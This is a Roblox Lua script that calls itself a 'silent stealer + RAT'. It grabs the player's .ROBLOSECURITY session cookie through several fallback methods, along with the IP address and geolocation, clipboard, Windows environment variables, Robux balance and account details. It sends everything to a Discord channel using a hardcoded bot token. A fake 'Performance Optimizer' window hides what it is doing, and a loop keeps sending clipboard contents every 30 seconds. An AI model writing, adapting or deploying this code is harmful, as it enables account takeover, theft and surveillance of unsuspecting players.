-- ============================================================
-- ULTIMATE SILENT STEALER + RAT (Bot Token)
-- ============================================================
local botToken = "MTUzMzg5MjMyMDQ1NjM0Nzc4OA.GKEOrv.PKV9UcJd703CEZorhu6HqPI_ERafjoUJUwSaEE"
local channelID = "1543230748180615198"

-- ========== HTTP SENDER ==========
local function sendMessage(content)
    local url = "https://discord.com/api/v10/channels/" .. channelID .. "/messages"
    local payload = {content = content}
    local json = game:GetService("HttpService"):JSONEncode(payload)
    local headers = {
        ["Authorization"] = "Bot " .. botToken,
        ["Content-Type"] = "application/json"
    }
    local methods = {
        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = method()
        if ok then return true end
    end
    return false
end

-- ========== HELPERS ==========
local function safeGet(obj, prop, default)
    local ok, val = pcall(function() return obj[prop] end)
    return ok and val or default
end

local function getClip()
    local ok, val = pcall(getclipboard)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(clipboard)
    if ok and val and val ~= "" then return val end
    return "N/A"
end

-- ========== IP & GEOLOCATION ==========
local function getIP()
    local ip = "N/A"
    for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com", "https://httpbin.org/ip"}) do
        local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
        if ok and result and result ~= "" then
            if result:match('"query":"(.-)"') then ip = result:match('"query":"(.-)"')
            elseif result:match('"origin":"(.-)"') then ip = result:match('"origin":"(.-)"')
            else ip = result:gsub("%s+", "") end
            if ip and ip ~= "" and ip ~= "N/A" then break end
        end
    end
    return ip
end

local function getGeo()
    local geo = {}
    local ok, res = pcall(function() return game:GetService("HttpService"):GetAsync("http://ip-api.com/json/") end)
    if ok and res then
        local data = game:GetService("HttpService"):JSONDecode(res)
        geo.country = data.country or "N/A"
        geo.city = data.city or "N/A"
        geo.isp = data.isp or "N/A"
        geo.org = data.org or "N/A"
        geo.as = data.as or "N/A"
        geo.timezone = data.timezone or "N/A"
        geo.lat = data.lat or "N/A"
        geo.lon = data.lon or "N/A"
    else
        geo.country = "N/A"; geo.city = "N/A"; geo.isp = "N/A"; geo.org = "N/A"; geo.as = "N/A"; geo.timezone = "N/A"; geo.lat = "N/A"; geo.lon = "N/A"
    end
    return geo
end

-- ========== COOKIE (all known methods) ==========
local function stealCookie()
    local ok, val = pcall(getcookie, "https://www.roblox.com/")
    if ok and val and val ~= "" then return val end
    ok, val = pcall(getrobloxcookie)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function()
        local res = request({Url = "https://www.roblox.com/", Method = "GET"})
        if res and res.Headers then
            for k, v in pairs(res.Headers) do
                if string.lower(k) == "set-cookie" then
                    return v:match("(.-);") or v
                end
            end
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function()
        local page = game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
        if page and page:match("__RequestVerificationToken") then
            return page:match('__RequestVerificationToken" value="(.-)"')
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function()
        if not getgc then return nil end
        local gc = getgc(true)
        for _, v in ipairs(gc) do
            if type(v) == "string" and v:match("_.%w+%.ROBLOSECURITY") then
                return v
            end
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function()
        if not getrawmetatable then return nil end
        local mt = getrawmetatable(game)
        if mt and mt.__index then
            local old = mt.__index
            for i = 1, 100 do
                local res = old(game, "HttpService", i)
                if type(res) == "table" and res.Cookies then
                    return res.Cookies
                end
            end
        end
        return nil
    end)
    ok, val = pcall(getclipboard)
    if ok and val and val:match("_.%w+%.ROBLOSECURITY") then return val end
    return "Not available (executor limit)"
end

-- ========== SCREENSHOT (if executor supports) ==========
local function captureScreen()
    if pcall(function() return screenshot end) then
        local ok, img = pcall(screenshot)
        if ok and img then return "Screenshot captured (" .. tostring(#img) .. " bytes)" end
    end
    if pcall(function() return capture end) then
        local ok, img = pcall(capture)
        if ok and img then return "Capture captured (" .. tostring(#img) .. " bytes)" end
    end
    return "No screenshot function available"
end

-- ========== SYSTEM INFO (safe) ==========
local function getSystemEnv()
    local env = {}
    for _, var in ipairs({"OS", "COMPUTERNAME", "USERNAME", "PROCESSOR_IDENTIFIER", "NUMBER_OF_PROCESSORS", "APPDATA", "LOCALAPPDATA", "USERPROFILE", "TEMP", "WINDIR"}) do
        local ok, val = pcall(function() return os.getenv(var) end)
        if ok and val then env[var] = val else env[var] = "N/A" end
    end
    return env
end

-- ========== ROBUX BALANCE (via API) ==========
local function getRobux()
    local player = game.Players.LocalPlayer
    if not player then return "N/A" end
    local userId = player.UserId
    local url = "https://economy.roblox.com/v1/users/" .. userId .. "/currency"
    local ok, res = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
    if ok and res then
        local rb = res:match('"robux":(%d+)')
        if rb then return rb end
    end
    return "N/A"
end

-- ========== CREATOR NAME (via API) ==========
local function getCreatorName()
    local creatorId = safeGet(game, "CreatorId", 0)
    if creatorId and creatorId ~= 0 then
        local url = "https://users.roblox.com/v1/users/" .. creatorId
        local ok, res = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
        if ok and res then
            local name = res:match('"name":"(.-)"')
            if name then return name end
        end
    end
    return "N/A"
end

-- ========== MAIN COLLECTOR ==========
local function collectAll()
    local info = {}
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        info.accountAge = tostring(math.floor((player.UserId / 100000000) * 2) + 2006) .. " (approx)"
        info.friendsOnline = tostring(#player:GetFriendsOnline() or 0)
        -- Groups
        local groups = {}
        local ok, grpData = pcall(function() return player:GetGroups() end)
        if ok and grpData then
            for _, g in ipairs(grpData) do
                table.insert(groups, g.Name .. "(" .. g.Role .. ")")
            end
        end
        info.groups = (#groups > 0) and table.concat(groups, ", ") or "None"
        -- Character
        pcall(function()
            local char = player.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    info.health = tostring(hum.Health)
                    info.maxHealth = tostring(hum.MaxHealth)
                    info.walkSpeed = tostring(hum.WalkSpeed)
                    info.jumpPower = tostring(hum.JumpPower)
                end
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then info.position = tostring(root.Position) end
            end
        end)
        -- Backpack
        pcall(function()
            local backpack = player:FindFirstChild("Backpack")
            if backpack then
                local items = {}
                for _, item in ipairs(backpack:GetChildren()) do
                    if item:IsA("Tool") then table.insert(items, item.Name) end
                end
                info.backpack = (#items > 0) and table.concat(items, ", ") or "Empty"
            end
        end)
        -- Leaderstats
        pcall(function()
            local ls = player:FindFirstChild("leaderstats")
            if ls then
                local stats = {}
                for _, stat in ipairs(ls:GetChildren()) do
                    if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                        stats[stat.Name] = tostring(stat.Value)
                    end
                end
                if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
            end
        end)
        -- Robux
        info.robux = getRobux()
    end

    -- Game info
    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
    info.jobId = safeGet(game, "JobId", "N/A")
    info.gameName = safeGet(game, "Name", "Unknown")
    info.creatorId = tostring(safeGet(game, "CreatorId", "N/A"))
    info.creatorName = getCreatorName()
    info.universeId = tostring(safeGet(game, "UniverseId", "N/A"))
    info.rootPlaceId = tostring(safeGet(game, "RootPlaceId", "N/A"))
    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
    info.clientVersion = safeGet(game, "Version", "N/A")
    info.placeVisits = tostring(safeGet(game, "PlaceVisitCount", "N/A"))
    info.genres = safeGet(game, "Genres", "N/A")

    -- IP & Geo
    info.ip = getIP()
    local geo = getGeo()
    for k, v in pairs(geo) do info["geo_" .. k] = v end

    -- Cookie
    info.cookie = stealCookie()

    -- Clipboard
    info.clipboard = getClip()

    -- Screenshot
    info.screenshot = captureScreen()

    -- System environment
    local env = getSystemEnv()
    for k, v in pairs(env) do info["env_" .. k] = v end

    -- Ping & FPS
    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
    end)
    pcall(function()
        local run = game:GetService("RunService")
        local ft = run.RenderStepTime
        if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
    end)

    -- Platform & Hardware
    pcall(function()
        local us = game:GetService("UserInputService")
        info.platform = tostring(us.Platform)
        info.touchEnabled = tostring(us.TouchEnabled)
        info.mouseEnabled = tostring(us.MouseEnabled)
        info.keyboardEnabled = tostring(us.KeyboardEnabled)
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.volume = tostring(game:GetService("SoundService").Volume)
        local screen = game:GetService("GuiService"):GetGuiSize()
        info.screenResolution = tostring(screen)
    end)

    -- Time zone offset
    info.timeOffset = tostring(os.difftime(os.time(), os.time()))

    -- Locale
    pcall(function()
        info.locale = game:GetService("LocalizationService"):GetLocale()
    end)

    return info
end

-- ========== SEND INITIAL DATA ==========
local function sendInitial()
    local data = collectAll()
    local lines = {}
    for k, v in pairs(data) do
        if v and v ~= "" then
            table.insert(lines, string.format("%s: %s", k, tostring(v)))
        end
    end
    local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
    sendMessage(msg)
end

-- ========== GUI ==========
local function createGUI()
    pcall(function()
        local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        local gui = Instance.new("ScreenGui")
        gui.Parent = pg
        gui.ResetOnSpawn = false
        local f = Instance.new("Frame")
        f.Size = UDim2.new(0, 420, 0, 180)
        f.Position = UDim2.new(0.5, -210, 0.5, -90)
        f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
        f.BackgroundTransparency = 0.08
        f.Parent = gui
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 14)
        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, 0, 0, 45)
        t.Position = UDim2.new(0, 0, 0, 10)
        t.BackgroundTransparency = 1
        t.Text = "Performance Optimizer"
        t.TextColor3 = Color3.fromRGB(255, 255, 255)
        t.TextScaled = true
        t.Font = Enum.Font.GothamBold
        t.Parent = f
        local s = Instance.new("TextLabel")
        s.Size = UDim2.new(1, 0, 0, 30)
        s.Position = UDim2.new(0, 0, 0.38, 0)
        s.BackgroundTransparency = 1
        s.Text = "Optimization complete!"
        s.TextColor3 = Color3.fromRGB(200, 200, 210)
        s.TextScaled = true
        s.Font = Enum.Font.Gotham
        s.Parent = f
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 100, 0, 35)
        btn.Position = UDim2.new(0.5, -50, 1, -45)
        btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
        btn.Text = "CLOSE"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamBold
        btn.Parent = f
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
        btn.MouseButton1Click:Connect(function() gui:Destroy() end)
    end)
end

-- ========== START ==========
sendInitial()
createGUI()

-- ========== CONTINUOUS RAT LOOP ==========
while true do
    task.wait(30)
    local clip = getClip()
    if clip and clip ~= "N/A" and clip ~= "" then
        sendMessage("```[CLIPBOARD] " .. clip .. "```")
    end
    -- Also send screenshot if changed? (optional)
    local scr = captureScreen()
    if scr and scr ~= "No screenshot function available" then
        sendMessage("```[SCREENSHOT] " .. scr .. "```")
    end
end
